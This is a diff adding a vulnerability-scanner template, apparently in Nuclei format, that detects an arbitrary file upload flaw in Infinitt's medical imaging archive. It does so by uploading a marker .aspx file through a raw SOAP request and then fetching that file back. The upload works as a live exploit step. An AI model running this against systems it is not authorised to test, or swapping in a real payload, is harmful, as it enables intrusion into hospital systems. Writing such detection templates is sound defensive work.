@@ -1,0 +1,72 @@
+id: poc-yaml-infinitt-webjobupload-anyfile-upload
+info:
+  name: WebJobUpload Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects the arbitrary file upload vulnerability in the WebJobUpload service of Infinitt's Medical Imaging Archiving system.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+  t3: "{{base64(t2)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /webservices/WebJobUpload.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://rainier/jobUpload"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <jobUpload xmlns="http://rainier">
+        <vcode>1</vcode>
+        <subFolder></subFolder>
+        <fileName>{{t1}}.aspx</fileName>
+        <bufValue>{{t3}}</bufValue>
+        </jobUpload>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<jobUploadResult>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        group: 1
+        regex:
+          - "SystemManager\\\\(?P<file>[0-9]+)\\\\"
+
+  - raw:
+      - |
+        GET /{{file}}/{{t1}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
